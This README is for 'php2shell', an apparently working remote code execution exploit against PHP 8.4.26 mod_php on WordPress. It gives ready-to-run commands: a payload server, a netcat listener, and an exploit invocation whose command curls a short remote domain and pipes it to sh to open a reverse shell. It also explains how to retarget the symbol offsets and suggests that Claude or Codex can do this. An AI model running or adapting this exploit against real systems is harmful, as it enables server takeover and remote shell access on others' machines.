# php2shell

An HTTP RCE PoC for CVE-2026-109618 and CVE-2026-109619 in PHP 8.4.26 mod_php. This release is for WordPress 7.1.3 on `php:8.4.26-apache@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a` with one prefork worker, ASLR on, and `display_errors=Off`. 

## Reverse shell demo

Keep in mind that you have a 14 character limit, in this instance for a rev-shell, we are using a 5 letter domain, curling it, and piping it to sh.

```bash
python3 serve.py --bind 172.17.0.1
```

```bash
nc -lvnp 4444 -s 172.17.0.1
```

```bash
python3 exploit.py \
  --url http://127.0.0.1:18086/wp-content/themes/twentytwentyfour/patterns/text-feature-grid-3-col.php \
  --cmd 'curl w9t.ai|sh' \
  --proof-url http://172.17.0.1/proof \
  --expect uid=
```

The exploit prints the returned `id` output; the shell opens in the `nc` terminal. `serve.py` serves the shell stage on port 80 and receives the proof callback. 

The symbol offsets match the tested image. For another build, supply `--libphp /path/to/libphp.so` or `--offsets-file offsets.env` with matching `ZIF_OFFSET` and `DTOR_OFFSET` values. Use `--memory 8` for the 8 MiB profile; the default is 128 MiB. The command limit is 14 UTF-8 bytes. (Or just have Claude / Codex update the offsets for you)